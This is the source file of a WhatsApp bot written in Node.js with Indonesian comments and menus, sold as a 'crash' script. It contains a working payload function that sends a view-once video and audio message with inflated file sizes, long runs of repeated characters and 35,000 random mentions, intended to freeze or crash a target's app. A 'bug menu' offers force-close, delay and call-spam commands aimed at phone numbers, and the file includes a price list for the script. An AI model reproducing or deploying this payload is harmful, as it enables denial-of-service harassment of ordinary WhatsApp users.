//////[𝙱𝚊𝚜𝚎 𝙱𝚢 𝙰𝚕𝚒𝚙]///////

//Jangan Di Sebar Base Ori Kaido By @alipoffc Khusus Pt Gw Doang Join Pt 15rb Sebar Bisa Gw error 

//enjoy pake 😝😝

//©Alip

require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = kirana = async (kirana, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? kirana.user.id.split(":")[0] + "@s.whatsapp.net" || kirana.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)
const owner2 = JSON.parse(fs.readFileSync("./database/owner.json"))
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
// Consta Variable
const botNumber = await kirana.decodeJid(kirana.user.id);
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await kirana.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const speed = require('performance-now')
const os = require("os")

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, formatp, sleep } = require('./lib/myfunction');
// Foto
let image = fs.readFileSync('./start/lib/media/alip.jpg')
var ppuser
try {
ppuser = await kirana.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = `${imgmenu}`
}
// Time
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

if (global.autoTyping) {
if (command) {
kirana.sendPresenceUpdate('composing', from)
}
}
kirana.autoshalat = kirana.autoshalat ? kirana.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? kirana.user.id : m.sender
	let id = m.chat 
    if(id in kirana.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
    terbit: '05:42',
    dhuha: '06:02',
    dzuhur: '11:32',
    ashar: '14:53',
    magrib: '17:23',
    isya: '18:38',
    }
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const fkethmb = await resize(ppuser, 300, 300)

let example = (teks) => {
return `\n𝗕𝘂𝗸𝗮𝗻 𝗴𝗶𝘁𝘂 𝗴𝗼𝗯𝗹𝗼𝗸
kek gini le ${isCmd} ${teks}\n`
}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363401201462646@newsletter`,
newsletterName: `Alip`,
jpegThumbnail: "",
caption: '𝙵𝚄𝚂𝙷𝙸𝙶𝚄𝚁𝙾',
inviteExpiration: Date.now() + 1814400000
}
}}


let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
ping = `ping : ${latensi.toFixed(4)} × ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`

//variable gambar
const valensya = fs.readFileSync('./start/lib/media/alip.jpg')
//end

const qtext2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝐊𝐚𝐢𝐝𝐨 𝐕𝟐" }}}

const mayzreply = (teks) => {
kirana.sendMessage(
        m.chat,
        {
          document: fs.readFileSync("./package.json"),
          fileName: `Hai ${pushname}`,
          fileLength: "99999999999999",
          caption: teks,
          mimetype: "image/png",
          headerType: 9,
          jpegThumbnail: fkethmb,
          contextInfo: { 
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: namaowner,
 newsletterJid: idsaluran,
 serverMessageId: 143
}}}, {quoted:qtext2})
}

///////[ 𝚃𝙰𝚁𝙾𝙷 𝙵𝚄𝙽𝙲𝚃 𝙰𝙼𝙿𝙰𝚂 𝙻𝚄]///////////
async function AudioVisualXDellay(target) {
  const msg = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          videoMessage: {
            caption: "꧔꧈".repeat(600),
            mimetype: "video/mp4",
            fileName: "𝐊𝐚𝐢𝐝𝐨 𝐂𝐫𝐚𝐬𝐡", 
            fileLength: "9999999999",
            seconds: 999999,
            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        }
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        ptt: true,
        seconds: 9999,
        fileName: "𝐊𝐚𝐢𝐝𝐨 𝐂𝐫𝐚𝐬𝐡" + "꧔꧈".repeat(500),
        fileLength: "9999999999",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            ...Array.from({ length: 35000 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  };

  await kirana.sendMessage(msg.to, msg.message);
}

//////[𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝙼𝚎𝚗𝚞]////////
switch (command) {
//========[ Menu Utama ]========//
case 'alip' : case 'kaido' : case 'menu' : {
await kirana.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }});
tramenu = 
`
 你 𝙺𝚊𝚒𝚍𝚘 𝙲𝚛𝚊𝚜𝚑
╰┈ⓘ Привет, 𝙰𝚕𝚒𝚙 позвольте имя создано для того, чтобы делать 

╭═━═━═━⪩
┃. 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡
┃▢ 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝙰𝚕𝚒𝚙
┃▢ 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : 𝙺𝚊𝚒𝚍𝚘
┃▢ ᴠᴇʀsɪᴏɴ : 𝟸.𝟶
┃▢ 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝙱𝚞𝚢,𝚅𝚒𝚙
╰═━═━═━═━═━═━═━═━═━⪩

( ! ) 𝗧𝗲𝗸𝗮𝗻 𝗧𝗼𝗺𝗯𝗼𝗹 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗻𝘂

© Alip
`
kirana.sendMessage(m.chat, {image: {url: imgmenu }, caption: tramenu ,
  footer: "𝐊𝐀𝐈𝐃𝐎",
  buttons: [
    {
      buttonId: '.tqto',
      buttonText: {
        displayText: 'ᴛʜᴀɴᴋs ᴛᴏ'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉',
          sections: [
            {
              title: namaowner,
              highlight_label: '𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢',
              rows: [
                {
                  header: "👻 𝙱𝚞𝚐 𝙼𝚎𝚗𝚞 👻",
                  title: 'bugmenu',
                  description: 'untuk menampilkan fitur Bug',
                  id: '.bugmenu',
                },
                {
                  header: '⚙️ 𝙰𝚕𝚕 𝙼𝚎𝚗𝚞 ⚙️',
                  title: 'AllMenu',
                  description: 'untuk menampilkan All menu',
                  id: '.owner',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ Thanks To ]========//
case 'tqto' : {
await kirana.sendMessage(m.chat, { react: { text: `🤌`, key: m.key }});
terimakasih = 
`
 𝙲𝚛𝚊𝚜𝚑
╭═━═━═━⪩
┃. 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡
┃▢ 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝙰𝚕𝚒𝚙
┃▢ 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : 𝙺𝚊𝚒𝚍𝚘
┃▢ ᴠᴇʀsɪᴏɴ : 𝟸.𝟶
┃▢ 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝙱𝚞𝚢,𝚟𝚒𝚙
╰═━═━═━═━═━═━═━═━═━⪩

╭═━⪩「 ᴛʜᴀɴᴋs ᴛᴏ 」
┃—▢ 𝐀𝐥𝐢𝐩 (𝐃𝐞𝐯)
┃—▢ 𝐙𝐲𝐲 (𝐂𝐞𝐨)
┃—▢ 𝐑𝐞𝐥𝐥 (𝐂𝐞𝐨)
┃─□ 𝐘𝐚𝐧𝐭𝐨 (𝐂𝐞𝐨)
┃─□ 𝐃𝐢𝐥𝐳 (𝐂𝐞𝐨)
┃─□ 𝐀𝐥𝐢𝐩[𝟐] (𝐂𝐞𝐨)
┃—▢ 𝐆𝐮𝐬 (𝐂𝐞𝐨)
┃—▢ 𝐃𝐳𝐚𝐤𝐤𝐲 (𝐌𝐨𝐝𝐬)
┃—▢ 𝐀𝐥𝐥 𝐏𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐒𝐜𝐫𝐢𝐩𝐭 
╰═━═━═━═━═━═━═━═━═━⪩
`
kirana.sendMessage(m.chat, {image: {url: imgmenu }, caption: terimakasih ,
  footer: "𝐊𝐚𝐢𝐝𝐨",
  buttons: [
    {
      buttonId: '.Alip',
      buttonText: {
        displayText: '⬅️ ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉',
          sections: [
            {
              title: namaowner,
              highlight_label: '𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢',
              rows: [
                {
                  header: '👻 𝙱𝚞𝚐 𝙼𝚎𝚗𝚞 👻',
                  title: 'bugmenu',
                  description: 'untuk menampilkan menu bug',
                  id: '.bugmenu',
                },
                {
                  header: "⚙️ 𝙰𝚕𝚕 𝙼𝚎𝚗𝚞 ⚙️",
                  title: 'AllMenu',
                  description: 'untuk menampilkan All menu',
                  id: '.owner',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ Beli Script ]========//
case 'belisc': {
let teks =`

𝗥𝗜𝗟𝗜𝗦 𝗦𝗖 𝗕𝗨𝗚 𝗡𝗘𝗪 𝗞𝗔𝗜𝗗𝗢

◉ 𝗞𝗮𝗶𝗱𝗼 𝗩𝟭 𝗚𝗲𝗻𝟮
- Kaido V1 Gen2 : 10rb

◉ 𝗞𝗮𝗶𝗱𝗼 𝗩𝟮 𝗡𝗲𝘄 𝗣𝗼
* po kaido v2 : 10rb
* Rilis Kaido v2 : 15rb
* Free up Kaido v2 : 18rb

𝗙𝗶𝘁𝘂𝗿 𝗗𝗮𝗻 𝗘𝗳𝗳𝗲𝗰𝘁 𝗕𝘂𝗴
- Forclose Instant
- Work WhatsApp Beta New
- Delay Hard 
- Delay invis
- Work WhatsApp Ori Playstore
- Hard Fix Bug
- Fix Harus Hapus Apk Wa Dulu

𝗣𝗿𝗼𝗱𝘂𝗸 𝗬𝗮𝗻𝗴 𝗧𝗲𝗿𝘀𝗲𝗱𝗶𝗮
- Reseller Sc Kaido 20rb
- PT Sc Kaido 30rb
- Moderators Kaido 40rb
- CEO Kaido 50rb

𝗕𝗲𝗻𝗲𝗳𝗶𝘁 𝗥𝗲𝘀𝘀
> Ress Dapet Free up Perma Dan Free Base

𝗕𝗲𝗻𝗲𝗳𝗶𝘁 𝗣𝘁
> PT Bisa Jual Ress Dan Admin Gb Ress 
> Dapet Funct Dan Base Yang Gw Pake

𝗕𝗲𝗻𝗲𝗳𝗶𝘁 𝗠𝗼𝗱𝘀
> Moderators Bisa Jual Pt Dan ress 
> Dapet  Admin Ch 
> Dapet Pt Vip Dan All Murid Gw
> Free Murban Dan Murunban Dari Gw 
> Gw Ajarin Step Bikin Sc

𝗕𝗲𝗻𝗲𝗳𝗶𝘁 𝗖𝗲𝗼
> Ceo Bisa Jual Semua Title Kaido 
> Dapet Admin Ch
> Free Pt Prib Dari Alip 
> Dapet Base + Dapet Funct Yang Gw Pake 
> Dapet Sc Duluan Sebelum Update


> 𝗔𝗹𝗹 𝗙𝗶𝘁𝘂𝗿 𝗦𝗰 𝗞𝗮𝗶𝗱𝗼 𝗜𝘁𝘂 𝗪𝗼𝗿𝗸 𝟭𝟬𝟬% 𝗞𝗮𝗹𝗼 𝗡𝗴𝗴𝗮𝗸 𝗪𝗼𝗿𝗸 𝗚𝘄 𝗥𝗲𝗳𝗳

𝗠𝗲𝗻𝘆𝗮𝗹𝗮 𝗔𝗯𝗮𝗻𝗴𝗸𝘂𝗵 🔥🔥

𝗠𝗶𝗻𝗮𝘁 𝗣𝘃 𝗔𝗹𝗶𝗽 𝗥𝗲𝗮𝗹 𝗗𝗲𝘃 𝗞𝗮𝗶𝗱𝗼
👇👇👇👇👇👇👇👇👇
📱Wa Alip : wa.me/6285855060683
📞Tele Alip : t.me/alipoffc
`;
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
   message: {
       "messageContextInfo": {
         "deviceListMetadata": {},
         "deviceListMetadataVersion": 2
       },
       interactiveMessage: proto.Message.InteractiveMessage.create({
         body: proto.Message.InteractiveMessage.Body.create({
           text: teks
         }),
         footer: proto.Message.InteractiveMessage.Footer.create({
           text: "BUY KLIK TOMBOL DI BAWAH"
         }),
         header: proto.Message.InteractiveMessage.Header.create({
           title: `🛒 \`Alip Developer\``,
           subtitle: "",
           hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://img1.pixhost.to/images/6965/618508862_skyzopedia.jpg" } }, { upload: kirana.waUploadToServer }))}),
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
           buttons: [
             {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛍 Buy Script\",\"url\":\"https://wa.me/6285855060683\",\"merchant_url\":\"https://www.google.com\"}`
             },
             {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🐉Saluran Official\",\"url\":\"https://whatsapp.com/channel/0029Vb6la5l9cDDYxiqbXj0G\",\"merchant_url\":\"https://www.google.com\"}`
             }
          ],
         })
       })
   }
 }
}, {})

await kirana.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
//========[ Others Menu ]========//
case 'owner' : {
await kirana.sendMessage(m.chat, { react: { text: `🐼`, key: m.key }});
fitursc = 
`
╭═━═━═━⪩
┃. 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡
┃▢ 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝙰𝚕𝚒𝚙
┃▢ 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : 𝙺𝚊𝚒𝚍𝚘
┃▢ ᴠᴇʀsɪᴏɴ : 𝟸.𝟶
┃▢ 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝙱𝚞𝚢,𝚅𝚒𝚙
╰═━═━═━═━═━═━═━═━═━⪩

 𝙾𝚠𝚗𝚎𝚛
╭⪩「⚙️ ᴏᴡɴᴇʀ ᴍᴇɴᴜ ⚙️ 」
┃—▢ .𝚊𝚍𝚍𝚘𝚠𝚗𝚎𝚛 <𝙽𝚘𝚖𝚎𝚛>
┃–𝚒𝚗𝚙𝚞𝚝 𝚢𝚘𝚞𝚛 𝙽𝚘𝚖𝚎𝚛    
┠─────────⊱
┃─▢ .𝚍𝚎𝚕𝚘𝚠𝚗𝚎𝚛 <𝙽𝚘𝚖𝚎𝚛>
┃–𝚒𝚗𝚙𝚞𝚝 𝚈𝚘𝚞 𝙽𝚘𝚖𝚎𝚛
┠─────────⊱
┃—▢ .𝚊𝚍𝚍𝚙𝚛𝚎𝚖 <𝙽𝚘𝚖𝚎𝚛>
┃–𝚒𝚗𝚙𝚞𝚝 𝚢𝚘𝚞𝚛 𝙽𝚘𝚖𝚎𝚛
┠─────────⊱
┃—▢ .𝚍𝚎𝚕𝚙𝚛𝚎𝚖 <𝙽𝚘𝚖𝚎𝚛>
┃–𝚒𝚗𝚙𝚞𝚝 𝚢𝚘𝚞𝚛 𝙽𝚘𝚖𝚎𝚛   
┠─────────⊱
┃─▢ .𝚙𝚞𝚋𝚕𝚒𝚌
┃–𝙿𝚞𝚋𝚕𝚒𝚌 𝚈𝚘𝚞 𝚂𝚌𝚛𝚒𝚙𝚝
┠─────────⊱
┃─▢ .𝚜𝚎𝚕𝚏
┃–𝙿𝚛𝚒𝚟𝚊𝚝𝚎 𝚈𝚘𝚞 𝚂𝚌𝚛𝚒𝚙𝚝
╰═━═━═━═━═━═━═━═━═━⪩
`
kirana.sendMessage(m.chat, {image: {url: imgmenu }, caption: fitursc ,
  footer: "🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉",
  buttons: [
    {
      buttonId: '.tqto',
      buttonText: {
        displayText: 'ᴛʜᴀɴᴋs ᴛᴏ'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉',
          sections: [
            {
              title: namaowner,
              highlight_label: '𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢',
              rows: [
                {
                  header: '𝙱𝚊𝚕𝚒𝚔 𝙺𝚎 𝙼𝚎𝚗𝚞',
                  title: 'menu',
                  description: 'untuk kembali ke menu utama',
                  id: '.Alip',
                },
                {
                  header: '👻 𝙱𝚞𝚐 𝙼𝚎𝚗𝚞 👻',
                  title: 'bug menu',
                  description: 'untuk menampilkan menu bug menu',
                  id: '.bugmenu',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}

//========[ Bug Menu ]========//
case 'bugmenu' : {
await kirana.sendMessage(m.chat, { react: { text: `☠️`, key: m.key }});
bugmenu = 
`
╭═━═━═━⪩
┃. 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡
┃▢ 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝙰𝚕𝚒𝚙
┃▢ 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : 𝙺𝚊𝚒𝚍𝚘
┃▢ ᴠᴇʀsɪᴏɴ : 𝟸.𝟶
┃▢ 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝙱𝚞𝚢,𝚅𝚒𝚙
╰═━═━═━═━═━═━═━═━═━⪩

╭═━⪩「🐉 ʙᴜɢ ᴍᴇɴᴜ 🐉 」
┃—▢ .forcehard 62xxx
┃- Force HardXBeta
┃- Tembus Beta
┠─────────⊱
┃—▢ .forcecombo 62xxx
┃- Force Combo
┃- Hapus Wa Ke Fix
┠─────────⊱
┃—▢ .bloodforce 62xxx
┃- Delay + Force
┃- Tahan lama 
┠─────────⊱
┃—▢ .superdelay 62xxx
┃- Delay Orang Tanpa Ampun
┃- Effect Lama
┠─────────⊱
┃—▢ .spamtelp 62xxx
┃- Spam Telpon Target
┃- Buat Prank Doang
┠─────────⊱
╰═━═━═━═━═━═━═━═━═━⪩

> Peringatan Keras : Setelah Mengirim Bug Ke Target Wajib Jeda 10 Menit Kenon Is Real 
`
kirana.sendMessage(m.chat, {image: {url: imgmenu }, caption: bugmenu ,
  footer: "",
  buttons: [
    {
      buttonId: '.tqto',
      buttonText: {
        displayText: 'ᴛʜᴀɴᴋs ᴛᴏ'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '🐉 𝐊𝐚𝐢𝐝𝐨 𝐌𝐞𝐧𝐮 🐉',
          sections: [
            {
              title: namaowner,
              highlight_label: '𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢',
              rows: [
                {
                  header: '👻 𝙱𝚞𝚐 𝙼𝚎𝚗𝚞 👻', 
                  title: 'bug menu',
                  description: 'untuk menampilkan fitur bug',
                  id: '.bugmenu',
                },
                {
                  header: '⚙️ 𝙰𝚕𝚕 𝙼𝚎𝚗𝚞 ⚙️',
                  title: 'AllMenu',
                  description: 'untuk menampilkan menu AllMenu',
                  id: '.owner',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ 𝙾𝚠𝚗𝚎𝚛 𝙲𝚊𝚜𝚎 ]========//
case "addowner": case "addown": {
if (!isOwner) return mayzreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return mayzreply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return mayzreply("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
let check = await kirana.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return mayzreply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
mayzreply(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
} else {
mayzreply(example("@tag/6283XXX"))
}
}
break
case "delowner": case "delown": {
if (!isOwner) return mayzreply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./database/owner.json", "[]")
return mayzreply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return mayzreply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return mayzreply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
m.reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
mayzreply(example("@tag/6283XXX"))
}
}
break
case "addprem": case "addpremium": {
if (!isOwner) return mayzreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return mayzreply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
mayzreply(`*Berhasil Menjadi Vip 💦*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return mayzreply(example("@tag/62838XXX"))
}}
break
case "delprem": case "delpremium": {
if (!isOwner) return mayzreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return mayzreply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
mayzreply(`*Berhasil Menghapus Yatim ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return mayzreply(example("@tag/62838XXX"))
}}
break
case "public": case "publik": {
if (!isOwner) return mayzreply(msg.owner)
kirana.public = true
mayzreply("Succes Ubah Bot Menjadi Public")
}
break
case "self": case "private": case "priv": case "prib": {
if (!isOwner) return mayzreply(msg.owner)
kirana.public = false
mayzreply("Succes mengubah ke mode senyap✅")
}
break
case "autotyping-off": {
if (!isOwner) return mayzreply(msg.owner)
global.autoTyping = false
mayzreply("Succes mematikan auto typing")
}
break
case "autotyping-on": {
if (!isOwner) return mayzreply(msg.owner)
global.autoTyping = true
mayzreply("Succes mengaktifkan auto typing")
}
break
case "statusbot": {
var teks = `
> *Auto Typing :* ${global.autoTyping ? "*✅*" : "*❌*"}
> *Mode Public :* ${kirana.public ? "*✅*" : "*❌*"}
> *Runtime :* *${runtime(process.uptime())}*
> *Owner :* ${isOwner ? "*✅*" : "*❌*"}
> Premium :* ${isPremium ? "*✅*" : "*❌*"}
`
mayzreply(teks)
}
break
case "hidetag": case "h": {
if (!isGroup) return mayzreply(msg.group)
if (!isAdmin && !isOwner) return mayzreply(msg.admin)
if (!m.quoted && !text) return mayzreply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
kirana.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
